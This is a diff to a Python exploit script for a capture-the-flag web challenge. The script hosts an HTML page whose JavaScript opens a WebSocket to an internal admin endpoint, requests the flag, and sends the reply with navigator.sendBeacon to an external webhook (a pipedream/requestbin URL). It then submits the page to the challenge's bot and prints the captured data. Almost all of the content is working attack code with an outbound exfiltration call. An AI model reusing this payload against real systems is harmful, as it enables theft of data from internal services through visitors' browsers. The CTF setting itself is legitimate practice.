@@ -4,32 +4,35 @@ sys.path.append('../')
 import WebUtils
 from WebUtils.HTTPSync import *
 from WebUtils.HTTPHost import http_host
+from WebUtils.HTTPWebhook import RequestBinWebHook
 
 WebUtils.setBaseURL('http://chall.polygl0ts.ch:9010/')
 
-src_html = """
-<body>
-<script>
-    let ws = new WebSocket('ws://web:8080/admin/ws');
-    ws.onopen = () => {
-        ws.send('flag');
-    };
-    ws.onmessage = (d) => {
-        console.log(d);
-        navigator.sendBeacon('https://enbit6i3l2ra4.x.pipedream.net/', d.data);
-    }
-</script>
-</body>
-"""
+with RequestBinWebHook("enbit6i3l2ra4") as hook:
+    src_html = """
+    <body>
+    <script>
+        let ws = new WebSocket('ws://web:8080/admin/ws');
+        ws.onopen = () => {
+            ws.send('flag');
+        };
+        ws.onmessage = (d) => {
+            console.log(d);
+            navigator.sendBeacon('""" + hook.url + """', d.data);
+        }
+    </script>
+    </body>
+    """
 
-# host payload
-url = http_host(src_html)
-print(url)
+    # host payload
+    url = http_host(src_html)
 
-res = post("/submit", data={
-    'url': url
-})
+    res = post("/submit", data={
+        'url': url
+    })
 
-print(res.text)
+    for req in hook.getRequestsSync():
+        print(req['body'])
+        break
 
 
